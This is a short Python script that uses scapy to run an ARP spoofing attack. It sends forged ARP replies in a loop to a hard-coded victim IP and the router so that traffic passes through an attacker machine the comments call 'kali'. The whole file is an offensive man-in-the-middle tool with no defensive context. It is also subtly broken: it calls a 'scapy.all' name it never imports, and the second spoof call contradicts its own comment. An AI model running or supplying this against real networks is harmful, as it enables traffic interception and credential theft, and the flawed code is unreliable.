#!/usr/bin/env python

import time
from scapy.all import *


def get_mac(ip):
    arp_request = scapy.all.ARP(pdst=ip)
    broadcast = scapy.all.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.all.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.all.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.all.send(packet, verbose=False)


sent_packages_count = 0

try:
    while True:
        spoof("192.168.2.79", "192.168.1.1")  # target ip and router ip
        spoof("192.168.1.1", "192.168.2.75")  # router ip and kali ip
        sent_packages_count = sent_packages_count + 2
        print("\r[+] Two packages sent: " + str(sent_packages_count), end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("[+] Detected CTRL + C ... Quitting.")